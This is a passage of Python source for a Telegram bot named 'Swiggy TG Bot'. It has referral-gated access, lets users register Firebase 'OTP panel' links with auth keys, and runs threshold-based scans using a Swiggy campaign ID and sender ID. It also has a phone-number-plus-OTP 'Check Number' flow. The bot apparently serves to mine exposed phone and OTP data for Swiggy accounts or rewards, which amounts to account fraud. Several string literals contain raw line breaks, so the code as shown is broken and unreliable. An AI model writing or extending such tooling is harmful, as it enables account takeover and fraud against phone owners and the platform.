                f"""Channels joined!

Step 2: Share your referral link to unlock the bot.

Your Referral Link:
{ref_link}

Current referrals: {refs}
{needed} more needed = 1 hour access

Every 3 referrals = 1 hour access!""",
            )
        else:
            await query.edit_message_text("All channels joined! Welcome!")
            await show_main_menu(update, context)


# ── Start Scan ─────────────────────────────────────────────────────────────────
async def start_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if uid not in ADMIN_IDS and not has_access(uid):
        await update.message.reply_text(
            "Access expired. Share your referral link to unlock!"
        )
        return

    my_panels = get_user_panels(uid)
    if not my_panels:
        await update.message.reply_text(
            """You have no panels!

Tap "Add My Panel" and add your Firebase panel link.
Only YOUR panels will be used - nobody else can access them.""",
        )
        return

    us = await session_manager.get(uid)
    if us.is_running:
        await update.message.reply_text(
            "Scan already running! Use Stop Scan first."
        )
        return

    if len(my_panels) == 1:
        pk = list(my_panels.keys())[0]
        context.user_data["selected_panel"] = pk
        await update.message.reply_text(
            f"""Panel auto-selected: {my_panels[pk].get('name', 'Unknown')}

Send settings:
threshold campaign_id sender

Example: 190 {DEFAULT_CAMPAIGN_ID} SWIGGY

Or just send "default" for defaults""",
        )
        context.user_data["awaiting_scan_settings"] = True
        return

    buttons = []
    for pk, pc in my_panels.items():
        buttons.append(
            [InlineKeyboardButton(pc.get("name", "Unknown"), callback_data=f"panel_{pk}")]
        )
    await update.message.reply_text(
        "Select YOUR panel to scan:",
        reply_markup=InlineKeyboardMarkup(buttons),
    )


async def panel_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    data = query.data
    if not data.startswith("panel_"):
        return

    pk = data[6:]
    my_panels = get_user_panels(uid)
    if pk not in my_panels:
        await query.edit_message_text("Panel not found.")
        return

    context.user_data["selected_panel"] = pk
    await query.edit_message_text(
        f"""Selected: {my_panels[pk].get('name', 'Unknown')}

Send settings:
threshold campaign_id sender

Example: 190 {DEFAULT_CAMPAIGN_ID} SWIGGY

Or just send "default" for defaults""",
    )
    context.user_data["awaiting_scan_settings"] = True


# ── Stop Scan ──────────────────────────────────────────────────────────────────
async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    us = await session_manager.get(uid)

    if not us.is_running:
        await update.message.reply_text("No scan running.")
        return

    for task_id, task in list(us.running_tasks.items()):
        task.cancel()
    us.running_tasks.clear()
    us.is_running = False

    await update.message.reply_text(
        f"""Scan Stopped!
Scanned: {us.total_scanned}
Found: {us.total_found}"""
    )


# ── Add My Panel ───────────────────────────────────────────────────────────────
async def handle_add_my_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if uid not in ADMIN_IDS and not has_access(uid):
        await update.message.reply_text("Access expired. Share your referral link to unlock!")
        return

    await update.message.reply_text(
        """Add YOUR Panel

Send your Firebase panel link:
- Raw: https://xxx-default-rtdb.firebaseio.com
- With auth: https://xxx.firebaseio.com?auth=KEY
- Encoded: https://panel.site/?s=...
- Merge: https://free-otp-panel.vercel.app/#merge=...

Only YOUR panel - nobody else can use it.
Multiple links = one per line""",
    )
    context.user_data["awaiting_add_my_panel"] = True


# ── Remove My Panel ────────────────────────────────────────────────────────────
async def handle_remove_my_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    my_panels = get_user_panels(uid)

    if not my_panels:
        await update.message.reply_text("You have no panels.")
        return

    lines = ["Remove YOUR Panel", ""]
    plist = []
    for i, (pk, pc) in enumerate(my_panels.items(), 1):
        lines.append(f"{i}. {pc.get('name')}")
        plist.append(pk)
    lines.append("")
    lines.append("Send number to remove.")

    context.user_data["awaiting_remove_my_panel"] = True
    context.user_data["my_panels_list"] = plist
    await update.message.reply_text("
".join(lines))


# ── My Panels ──────────────────────────────────────────────────────────────────
async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    my_panels = get_user_panels(uid)

    if not my_panels:
        await update.message.reply_text(
            """You have no panels.

Tap "Add My Panel" to add your link.""",
        )
        return

    lines = ["Your Panels", "====================", ""]
    for i, (pk, pc) in enumerate(my_panels.items(), 1):
        api_url = pc.get("api_url", "")[:45]
        lines.append(f"{i}. {pc.get('name')}")
        lines.append(f"   API: {api_url}...")
        lines.append("")
    lines.append("These are PRIVATE - nobody else can see them.")

    await update.message.reply_text("
".join(lines))


# ── My Status ──────────────────────────────────────────────────────────────────
async def my_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    us = await session_manager.get(uid)
    my_panels = get_user_panels(uid)

    lines = [
        "Your Status",
        "====================",
        f"Your Panels: {len(my_panels)}",
        f"Scan Running: {'Yes' if us.is_running else 'No'}",
    ]
    if us.is_running:
        lines.append(f"Scanned: {us.total_scanned}")
        lines.append(f"Found: {us.total_found}")
        lines.append(f"Workers: {DEFAULT_WORKERS}")
    lines.append("====================")

    await update.message.reply_text("
".join(lines))


# ── My Referral ────────────────────────────────────────────────────────────────
async def my_referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = get_user(uid)
    refs = u.get("referrals_given", 0) if u else 0
    bot_info = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
    next_milestone = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)

    await update.message.reply_text(
        f"""Your Referral
====================
Total: {refs}
Next 1h access in: {next_milestone} more referral(s)

Your Link:
{ref_link}

Every 3 referrals = 1 hour access!
Share and unlock the bot!""",
    )


# ── My Access ──────────────────────────────────────────────────────────────────
async def my_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        await update.message.reply_text("Admin - Unlimited access!")
        return
    u = get_user(uid)
    expiry = u.get("access_expiry", 0) if u else 0
    refs = u.get("referrals_given", 0) if u else 0
    if expiry > time.time():
        remaining = int(expiry - time.time())
        hours, rem = divmod(remaining, 3600)
        mins = rem // 60
        exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        await update.message.reply_text(
            f"""Access Active
Expires: {exp_str}
Remaining: {hours}h {mins}m
Referrals: {refs}""",
        )
    else:
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        await update.message.reply_text(
            f"""No Access
Referrals: {refs}
{needed} more = 1 hour access

Use /start to get your referral link""",
        )


# ── Text message router ───────────────────────────────────────────────────────
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    uid = update.effective_user.id

    # ── Check Number: waiting for OTP from user ───────────────────────────────
    if context.user_data.get("awaiting_check_otp"):
        await check_single_number_verify(update, context)
        return

    # ── Check Number: waiting for phone number ────────────────────────────────
    if context.user_data.get("awaiting_check_phone"):
        await check_single_number_otp(update, context)
        return

    # ── Scan settings ─────────────────────────────────────────────────────────
    if context.user_data.get("awaiting_scan_settings"):
        context.user_data.pop("awaiting_scan_settings")
        panel_key = context.user_data.get("selected_panel")
        if not panel_key:
            await update.message.reply_text("Panel not selected. Try again.")
            return

        if text.lower() == "default":
            threshold = DEFAULT_THRESHOLD
            campaign_id = DEFAULT_CAMPAIGN_ID
            sender = DEFAULT_SENDER
        else:
            parts = text.strip().split()
            threshold = DEFAULT_THRESHOLD
            campaign_id = DEFAULT_CAMPAIGN_ID
            sender = DEFAULT_SENDER
            try:
                if len(parts) >= 1:
                    threshold = int(parts[0])
                if len(parts) >= 2:
                    campaign_id = parts[1]
                if len(parts) >= 3:
                    sender = parts[2]
            except ValueError:
                await update.message.reply_text(
                    'Invalid format. Use: threshold campaign_id sender
Or just send "default"'
                )
                return

        asyncio.create_task(
            run_scraper(uid, context.application, panel_key, sender, campaign_id, threshold)
        )
        await update.message.reply_text(
            f"""Scan Started!
Threshold: Rs {threshold}
Campaign: {campaign_id}
Sender: {sender}
Workers: {DEFAULT_WORKERS}

You'll get progress updates. Use Stop Scan to cancel.""",
        )
        return

    # ── Add My Panel flow ─────────────────────────────────────────────────────
    if context.user_data.get("awaiting_add_my_panel"):
        context.user_data.pop("awaiting_add_my_panel")
        if uid not in ADMIN_IDS and not has_access(uid):
            await update.message.reply_text("Access expired!")
            return

        links = [line.strip() for line in text.split("
") if line.strip()]
        if not links:
            await update.message.reply_text("No link found.")
            return

        added = 0
        failed = []
        my_panels = get_user_panels(uid)
        existing_urls = {
            pc.get("api_url", "").rstrip("/").lower() for pc in my_panels.values()
        }

        for link in links:
            if not link.startswith("http"):
                if "#merge=" in link:
                    link = "https://free-otp-panel.vercel.app/" + link
                else:
                    failed.append(link[:40])
                    continue

            parsed_link = urllib.parse.urlparse(link)
            if parsed_link.fragment.startswith("merge="):
                merge_list = decode_merge_panels(link)
                if not merge_list:
                    failed.append(link[:40])
                    continue
                for api_url, auth_key in merge_list:
                    normalised = api_url.rstrip("/").lower()
                    if normalised in existing_urls:
                        continue
                    add_user_panel(
                        uid,
                        {
                            "name": f"Panel {len(my_panels) + added + 1}",
                            "api_url": api_url,
                            "auth_key": auth_key,
                            "panel_url": link,
                            "added_date": datetime.now().strftime("%Y-%m-%d"),
                        },
                    )
                    existing_urls.add(normalised)
                    added += 1
                continue

            api_url, auth_key = get_panel_api_url(link)
            if not api_url:
                failed.append(link[:40])
                continue

            normalised = api_url.rstrip("/").lower()
            if normalised in existing_urls:
                continue

            add_user_panel(
                uid,
                {
                    "name": f"Panel {len(my_panels) + added + 1}",
                    "api_url": api_url,
                    "auth_key": auth_key,
                    "panel_url": link,
                    "added_date": datetime.now().strftime("%Y-%m-%d"),
                },
            )
            existing_urls.add(normalised)
            added += 1

        msg = f"{added} panel(s) added to YOUR account!"
        if failed:
            msg += f"
Failed ({len(failed)}):"
            for f_item in failed:
                msg += f"
  - {f_item}"
        msg += "
Only YOU can use these - nobody else."
        await update.message.reply_text(msg)
        return

    # ── Remove My Panel flow ──────────────────────────────────────────────────
    if context.user_data.get("awaiting_remove_my_panel"):
        context.user_data.pop("awaiting_remove_my_panel")
        plist = context.user_data.pop("my_panels_list", [])
        try:
            idx = int(text) - 1
            if 0 <= idx < len(plist):
                my_panels = get_user_panels(uid)
                removed_name = my_panels.get(plist[idx], {}).get("name", "Unknown")
                remove_user_panel(uid, plist[idx])
                await update.message.reply_text(
                    f"Panel '{removed_name}' removed from your account!"
                )
            else:
                await update.message.reply_text("Wrong number!")
        except ValueError:
            await update.message.reply_text("Invalid input!")
        return

    # ── Menu button routing ───────────────────────────────────────────────────
    if text == "Start Scan":
        await start_scan(update, context)
    elif text == "Stop Scan":
        await stop_scan(update, context)
    elif text == "Check Number":
        await check_single_number_start(update, context)
    elif text == "Add My Panel":
        await handle_add_my_panel(update, context)
    elif text == "Remove My Panel":
        await handle_remove_my_panel(update, context)
    elif text == "My Panels":
        await my_panels_command(update, context)
    elif text == "My Status":
        await my_status_command(update, context)
    elif text == "My Referral":
        await my_referral_command(update, context)
    elif text == "My Access":
        await my_access_command(update, context)


# ── Main ───────────────────────────────────────────────────────────────────────
async def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(
        CallbackQueryHandler(check_join_callback, pattern="^check_join$")
    )
    application.add_handler(
        CallbackQueryHandler(panel_selected_callback, pattern="^panel_")
    )
    application.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message)
    )

    logger.info("Swiggy TG Bot (Private Panels + Single Check) starting...")
    async with application:
        await application.initialize()
        await application.start()
        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        while True:
            await asyncio.sleep(1)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        logger.fatal(f"Fatal error: {e}")
